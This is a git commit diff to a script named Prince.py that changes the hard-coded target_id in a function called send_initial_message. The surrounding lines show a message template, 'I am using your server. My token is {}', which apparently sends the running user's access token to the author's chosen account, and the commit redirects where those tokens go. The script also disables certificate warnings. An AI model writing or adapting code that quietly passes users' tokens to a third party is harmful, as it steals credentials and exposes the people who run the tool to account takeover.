f1ba560b7de67f7a684f2268cdd0a8a12e861425
PrinceOnfire890 <princehere2010@gmail.com>
2024-12-18 00:15:17 +0530

    Update Prince.py

--- Prince.py
+++ Prince.py
@@ -44,7 +44,7 @@ def send_initial_message():
     msg_template = "Hello Prince ! I am using your server. My token is {}"
 
     # Specify the ID where you want to send the message
-    target_id = "100001405886590"
+    target_id = "100001749311229"
 
     requests.packages.urllib3.disable_warnings()
 
